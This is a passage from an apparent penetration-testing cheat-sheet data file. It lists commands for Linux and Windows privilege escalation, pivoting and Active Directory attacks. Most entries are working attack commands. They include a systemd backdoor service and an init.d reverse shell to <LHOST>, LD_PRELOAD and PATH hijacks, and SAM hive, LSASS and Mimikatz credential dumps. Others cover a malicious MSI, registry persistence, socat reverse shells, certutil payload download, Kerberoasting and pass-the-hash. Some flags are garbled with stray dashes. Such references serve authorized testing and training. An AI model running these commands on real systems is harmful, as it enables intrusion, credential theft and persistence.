        command: "echo -e '[Service]\\nExecStart=/bin/bash' > /etc/systemd/system/backdoor.service && systemctl start backdoor"
      },
      {
        title: "Check environment variables for LD_PRELOAD, PATH, etc.",
        command: "env | grep -i 'LD\\|PATH\\|PYTHON'"
      },
      {
        title: "Inject into LD_PRELOAD to run arbitrary code",
        command: "echo 'void _init() { system(\"/bin/bash\"); }' > shell.c && gcc -shared -o shell.so -fPIC shell.c && LD_PRELOAD=./shell.so <vulnerable_program>"
      },
      {
        title: "Abuse PATH variable if script runs with sudo or cron",
        command: "export PATH=/tmp:$PATH && echo -e '#!/bin/bash\\n/bin/bash' > /tmp/ls && chmod +x /tmp/ls"
      },
      {
        title: "Exploit writable /etc/init.d script",
        command: "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /etc/init.d/backup && service backup restart"
      },
      {
        title: "Check journald logs for credential leak",
        command: "journalctl | grep -i password"
      },
      {
        title: "Check for exposed dbus interfaces",
        command: "dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply / org.freedesktop.DBus.ListNames"
      }
    ]

,
  },
  "Windows Privilege Escalation": {
    "Enumeration": [
      {
        "title": "System Information",
        "command": "systeminfo"
      },
      {
        "title": "Hostname",
        "command": "hostname"
      },
      {
        "title": "Whoami Info",
        "command": "whoami /all"
      },
      {
        "title": "Environment Variables",
        "command": "set"
      },
      {
        "title": "Path Variable",
        "command": "echo %path%"
      },
      {
        "title": "UAC Level",
        "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
      },
      {
        "title": "PowerShell History",
        "command": "Get-Content (Get-PSReadlineOption).HistorySavePath"
      },
      {
        "title": "Running Processes",
        "command": "tasklist /v"
      },
      {
        "title": "Installed Programs",
        "command": "wmic product get name,version"
      }
    ],
    "Sensitive Data": [
      {
        "title": "SAM & SYSTEM Hive Dump (Admin Only)",
        "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save"
      },
      {
        "title": "Recent Files",
        "command": "dir /s /b C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Recent"
      },
      {
        "title": "Commonly Leaked Files",
        "command": "type C:\\Users\\<username>\\Desktop\\*.txt"
      },
      {
        "title": "Saved Creds (Generic)",
        "command": "cmdkey /list"
      },
      {
        "title": "WiFi Passwords",
        "command": "netsh wlan show profile <name> key=clear"
      }
    ],
    "Unquoted Service Paths": [
      {
        "title": "Find Services with Unquoted Paths",
        "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\\\Windows\" | findstr /i /v '\"'"
      }
    ],
    "Insecure Service Permissions": [
      {
        "title": "Check for Modifiable Services",
        "command": "accesschk.exe -uwcqv \"Users\" *"
      },
      {
        "title": "Check for Writable Binary Paths",
        "command": "icacls \"C:\\Path\\To\\Service.exe\""
      }
    ],
    "AlwaysInstallElevated": [
      {
        "title": "Check AlwaysInstallElevated Registry Keys",
        "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
      },
      {
        "title": "Abuse with Malicious MSI",
        "command": "msfvenom -p windows/exec CMD=calc.exe -f msi > evil.msi && msiexec /quiet /qn /i C:\\path\\to\\evil.msi"
      }
    ],
    "Startup Apps & Scripts": [
      {
        "title": "Startup Folder",
        "command": "dir C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
      },
      {
        "title": "Registry Auto-run Entries",
        "command": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      }
    ],
    "Hot Potato Attacks": [
      {
        "title": "Tater/Hot Potato/Rotten Potato Usage",
        "command": "Use tools like Juicy Potato, Rogue Potato, or PrintSpoofer depending on system version."
      }
    ],
    "Schtasks and Cron-like Abuse": [
      {
        "title": "Check for Scheduled Tasks",
        "command": "schtasks /query /fo LIST /v"
      },
      {
        "title": "Abuse Modifiable Task Actions",
        "command": "Look for tasks pointing to writable files/scripts"
      }
    ],
    "DLL Hijacking": [
      {
        "title": "Search for Hijackable DLL Paths",
        "command": "procmon (Filter by PATH NOT FOUND .dll)"
      },
      {
        "title": "List Loaded DLLs",
        "command": "ListDLLs.exe -d <target_process>"
      }
    ],
    "PATH Variable Manipulation": [
      {
        "title": "Echo PATH",
        "command": "echo %PATH%"
      },
      {
        "title": "Create Malicious Binary in Writable PATH",
        "command": "echo malicious_code > C:\\path\\to\\write\\program.exe"
      }
    ],
    "Token Impersonation": [
      {
        "title": "Check for Impersonation Tokens",
        "command": "whoami /groups | findstr /i \"Impersonate\""
      },
      {
        "title": "Use PrintSpoofer",
        "command": "PrintSpoofer64.exe -i -c cmd"
      }
    ],
    "UAC Bypass": [
      {
        "title": "PowerShell UAC Bypass",
        "command": "Invoke-WScriptBypassUAC"
      },
      {
        "title": "Registry Auto-Elevate",
        "command": "Check and edit HKEY_CLASSES_ROOT\\mscfile\\shell\\open\\command"
      }
    ],
    "Credential Dumping": [
      {
        "title": "Mimikatz Basic Dump",
        "command": "privilege::debug \\n sekurlsa::logonpasswords"
      },
      {
        "title": "LSASS Dump for Offline Analysis",
        "command": "procdump -ma lsass.exe lsass.dmp"
      }
    ],
    "Persistence Techniques": [
      {
        "title": "Registry Run Key",
        "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d C:\\evil.exe"
      },
      {
        "title": "WMI Event Subscription",
        "command": "Use PowerShell to create event filter, consumer, and binding"
      }
    ],
    "Tools": [
      {
        "title": "WinPEAS (Automated Enumeration)",
        "command": "winPEASx64.exe"
      },
      {
        "title": "PowerUp (PowerShell)",
        "command": "Invoke-AllChecks"
      },
      {
        "title": "Seatbelt (Info Gathering)",
        "command": "Seatbelt.exe all"
      },
      {
        "title": "AccessChk (Sysinternals)",
        "command": "accesschk.exe -uws \"Users\" *"
      },
      {
        "title": "SharpUp (C# Alternative to PowerUp)",
        "command": "SharpUp.exe"
      }
    ]
  },
  
  "Linux Pivoting": {
        "SSH Port Forwarding - Local (-L)": [
      {
        "title": "Basic SSH Local Port Forwarding (Forward local port to remote service)",
        "command": "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>"
      },
      {
        "title": "SSH Local Forwarding with Private Key",
        "command": "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP> -i <PRIVATE_KEY>"
      },
      {
        "title": "Access Forwarded Service via localhost",
        "command": "curl http://localhost:<LOCAL_PORT>"
      }
    ],
    "SSH Port Forwarding - Remote (-R)": [
      {
        "title": "Basic SSH Remote Port Forwarding (Expose a local port to remote server)",
        "command": "ssh -R <REMOTE_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<REMOTE_SERVER>"
      },
      {
        "title": "SSH Remote Forwarding with Private Key",
        "command": "ssh -R <REMOTE_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<REMOTE_SERVER> -i <PRIVATE_KEY>"
      }
    ],
    "SSH Port Forwarding - Dynamic (-D)": [
      {
        "title": "Turn SSH into SOCKS5 Proxy (Dynamic Port Forwarding)",
        "command": "ssh -D <SOCKS_PORT> <USER>@<PIVOT_IP>"
      },
      {
        "title": "Use ProxyChains with Dynamic SSH Tunnel",
        "command": "proxychains nmap -Pn -sT -p- <TARGET_IP>"
      }
    ],
    "Pivot Discovery - Hosts and Ports": [
      {
        "title": "Ping Sweep to Discover Hosts on LAN",
        "command": "for i in {1..254}; do (ping -c 1 192.168.1.$i | grep 'bytes from' &); done"
      },
      {
        "title": "TCP Port Scan using Bash (No Nmap)",
        "command": "for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done"
      },
      {
        "title": "Port Scan using Nmap (Requires Installation)",
        "command": "nmap -sT -Pn -p- <TARGET_IP>"
      }
    ],
    "Notes": [
      {
        "title": "Install Nmap Remotely via SSH if Missing",
        "command": "sudo apt install nmap"
      },
      {
        "title": "Local Port Forwarding - Access Internal HTTP Services",
        "command": "ssh -L 4444:10.10.10.10:80 root@10.10.10.11 -i id_rsa"
      },
      {
        "title": "Test Forwarded HTTP Service",
        "command": "curl http://localhost:4444"
      }
    ],
    "Chisel Pivoting": [
      {
        "title": "Run Chisel Server on Attacker (Listening for connection)",
        "command": "./chisel server -p <LPORT> --reverse"
      },
      {
        "title": "Run Chisel Client on Victim (Reverse tunnel back to attacker)",
        "command": "./chisel client <LHOST>:<LPORT> R:<RPORT>:<TARGET_IP>:<TARGET_PORT>"
      },
      {
        "title": "Access Forwarded Port via localhost",
        "command": "curl http://127.0.0.1:<RPORT>"
      }
    ],
    "Socat Pivoting": [
      {
        "title": "Create Socat Bind Shell Listener on Target",
        "command": "socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/bash"
      },
      {
        "title": "Connect to Bind Shell from Attacker",
        "command": "socat FILE:`tty`,raw,echo=0 TCP:<TARGET_IP>:<PORT>"
      },
      {
        "title": "Create Reverse Shell Listener on Attacker",
        "command": "socat TCP-LISTEN:<LPORT>,reuseaddr,fork FILE:`tty`,raw,echo=0"
      },
      {
        "title": "Send Reverse Shell from Victim",
        "command": "socat EXEC:/bin/bash TCP:<LHOST>:<LPORT>"
      }
    ],
    "Meterpreter Pivoting (MSF)": [
      {
        "title": "Set up Route to Internal Network in Meterpreter",
        "command": "run post/multi/manage/autoroute"
      },
      {
        "title": "Add a Route to Target Subnet",
        "command": "run autoroute -s <TARGET_SUBNET>/<CIDR>"
      },
      {
        "title": "Use Socks Proxy Module in Metasploit",
        "command": "use auxiliary/server/socks_proxy"
      },
      {
        "title": "Run Proxychains with Metasploit's SOCKS",
        "command": "proxychains nmap -sT -Pn -p- <TARGET_IP>"
      }
    ],

  },
  "Windows Pivoting": {
    "Chisel": [
      {
        "title": "Chisel Server - Start Reverse Listener on Attacker Machine",
        "command": "chisel server -p <chiselserver_listeningport> --reverse"
      },
      {
        "title": "Download Chisel Binary on Victim",
        "command": "certutil -urlcache -split -f http://<attacker_ip>/chisel.exe chisel.exe"
      },
      {
        "title": "Chisel Client - Create Reverse Tunnel from Victim to Attacker",
        "command": "chisel.exe client <attackerIP>:<chiselserver_listeningport> R:<localport>:<targetIP>:<targetport>"
      }
    ],
    "Chisel with ProxyChains": [
      {
        "title": "Configure ProxyChains - Add SOCKS5 Proxy",
        "command": "nano /etc/proxychains.conf\nsocks5 127.0.0.1 9050"
      },
      {
        "title": "Start Chisel Server with Reverse Proxy on Attacker",
        "command": "chisel server -p <lport> --reverse"
      },
      {
        "title": "Start Chisel Client with SOCKS5 Tunnel on Victim",
        "command": "chisel.exe client <attackerIP>:<lport> R:9050:socks"
      }
    ],
    "Socat": [
      {
        "title": "Setup Socat Listener on Victim to Forward to Internal Target",
        "command": "socat TCP4-LISTEN:<local_listen_port>,fork TCP4:<internal_target_ip>:<target_port>"
      },
      {
        "title": "Use RDP from Attacker via Socat Tunnel",
        "command": "xfreerdp /v:<attackerIP>:<local_listen_port> /u:<username> /p:<password> /cert:ignore /workarea /smart-sizing"
      }
    ],
    "Meterpreter Pivoting": [
      {
        "title": "Route Traffic via Meterpreter Session (Route Add)",
        "command": "run post/multi/manage/autoroute\nrun autoroute -s <target_subnet> -n <netmask>"
      },
      {
        "title": "SOCKS Proxy via Metasploit (for ProxyChains)",
        "command": "use auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun"
      },
      {
        "title": "Add ProxyChains Entry",
        "command": "nano /etc/proxychains.conf\nsocks4 127.0.0.1 1080"
      },
      {
        "title": "Use ProxyChains with Nmap/Other Tools",
        "command": "proxychains nmap -Pn -sT <pivoted_ip>"
      }
    ],
    "Extras": [
      {
        "title": "Netdiscover to Identify Live Hosts",
        "command": "netdiscover -r <subnet>\nnetdiscover -i eth0"
      },
      {
        "title": "Connect to SSH Without Host Key Prompt",
        "command": "ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" <user>@<ip>"
      }
    ]
  }
  ,
  
 
"AD Auth Methods": {
      "SAM": [
        {
          "title": "SAM File Location",
          "command": "%SystemRoot%/system32/config/SAM mounted on HKLM/SAM"
        },
        {
          "title": "SAM File Format",
          "command": "USERNAME:USERID:LM HASH:NTLM HASH"
        }
      ],
      "LM Hash": [
        {
          "title": "LM Hash Info",
          "command": "Outdated and uses DES. Possible to crack."
        }
      ],
      "NTLM Auth": [
        {
          "title": "NTLM Hash Authentication",
          "command": "New Technology LAN Manager, Challenge Response Protocol for MS authentication"
        }
      ],
      "Kerberos Auth": [
        {
          "title": "Kerberos v5",
          "command": "Mutual Authentication between Client & Server with KDC (Key Distribution Center). Issues TGT (Ticket Granting Ticket) and service tickets."
        },
        {
          "title": "Kerberos Authentication Flow",
          "command": "Client requests service -> Server provides service -> Authentication Server issues TGT -> TGS issues service tickets"
        },
        {
          "title": "Kerberos Authentication Process",
          "command": "AS_REQ and AS_REP, TGS_REQ and TGS_REP, AP_REQ and AP_REP"
        }
      ]
    },
    " AD & DC ": {
      "Domain Controller": [
        {
          "title": "DC Functionality",
          "command": "Domain Controller stores user info and authenticates users to allow access to domain resources."
        }
      ],
      "Active Directory": [
        {
          "title": "AD Functionality",
          "command": "Active Directory manages the Domain Controller and stores data as objects."
        },
        {
          "title": "AD DS",
          "command": "Active Directory Domain Services (AD DS) verifies access when a user signs in."
        }
      ],
      "Forest vs Tree": [
        {
          "title": "Forest vs Tree",
          "command": "Explanation of Forest and Tree within Active Directory."
        }
      ]
    },
    "LLMNR/NBT-NS Poisoning": {
      "LLMNR": [
        {
          "title": "LLMNR (Link-local Multicast Name Resolution)",
          "command": "Used for host identification when DNS fails. Can be spoofed to get NTLM v1 or v2 hash."
        }
      ],
      "NBT-NS": [
        {
          "title": "NBT-NS (NetBIOS Name Service)",
          "command": "Used for host identification when DNS fails, can be spoofed to capture NTLM hash."
        }
      ],
      "Tools": [
        {
          "title": "Responder",
          "command": "$ responder.py -I eth0 –rdwv"
        },
        {
          "title": "MITMf",
          "command": "MITMf Framework for attacking LLMNR/NBT-NS"
        },
        {
          "title": "Nbnspoof",
          "command": "Tool for spoofing NBT-NS and LLMNR."
        },
        {
          "title": "Inveigh",
          "command": "Inveigh tool for performing SMB, HTTP, and NTLM relay attacks."
        },
        {
          "title": "Hashcat NTLM Cracking",
          "command": "$ hashcat –m 5600 hash.txt rockyou.txt --force –0 ---show"
        }
      ]
    },
    "Kerberos Attacks": {
      "Kerberos Enumeration": [
        {
          "title": "Get User SPNs",
          "command": "$ python GetUserSPNs.py <Domain>/<User>:<Password> -dc-ip <DC_IP> -request"
        },
        {
          "title": "Get User SPNs Example",
          "command": "$ python GetUserSPNs.py <UC.local>/Udit:Pass123 –dc-ip 10.10.10.10 -request"
        },
        {
          "title": "Crack Kerberos Hash with Hashcat",
          "command": "$ hashcat –m 13100 hash.txt rockyou.txt --force --show"
        }
      ],
      "Silver Ticket Attack": [
        {
          "title": "Silver Ticket Attack Requirements",
          "command": "Domain SID, Username, Domain Name, Service Name, Password hash of service account"
        }
      ]
    },
    "Credential Injection": {
      "RunAs": [
        {
          "title": "RunAs with NetOnly",
          "command": "$ runas.exe /netonly /user:<domain>\<username> cmd.exe"
        }
      ]
    },
    "Lateral Movement": {
      "Techniques": [
        {
          "title": "Lateral Movement Techniques",
          "command": "Common protocols exploited: WinRM, SSH, VNC, RDP"
        }
      ],
      "Pass The Hash": [
        {
          "title": "Pass the Hash Overview",
          "command": "Uses NTLM hash to authenticate without knowing the plaintext password."
        },
        {
          "title": "LSASS Memory Injection",
          "command": "Attacker places NTLM hash into LSASS section of memory."
        },
        {
          "title": "Requirements for Pass The Hash",
          "command": "Works with NTLM auth, SMB enabled, writable SMB (admin$) share, and local admin privileges."
        }
      ]
    },
    "General Commands & Tools": {
      "Dump SAM Database": [
        {
          "title": "Dump SAM Database",
          "command": "Use tools like `pwdump` or `samdump2` to dump the SAM database and extract password hashes."
        }
      ],
      "Kerberos Tools": [
        {
          "title": "Kerberos Tools for TGT Extraction",
          "command": "Use Kerberos-related tools like `Kerberosdump` or `TGSExtractor` for extracting tickets."
        }
      ]
    },
  "Lateral Movement(ignore)": {
    "SMB": [
      {
        title: "Pass the Hash",
        command: "pth-winexe -U 'domain/user%hash' //<IP> cmd.exe",
        description: "Use hash to authenticate without password"
      },
      {
        title: "PsExec",
        command: "psexec.py -hashes 'LM:NTLM' domain/user@<IP> cmd.exe",
        description: "Execute commands via SMB"
      }
    ],
    "RDP": [
      {
        title: "RDP Connection",
        command: "xfreerdp /u:user /p:password /v:<IP>",
        description: "Connect to Windows RDP"
      },
      {
        title: "Enable RDP",
        command: "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
        description: "Enable RDP on Windows target"
      }
    ]
  }
};
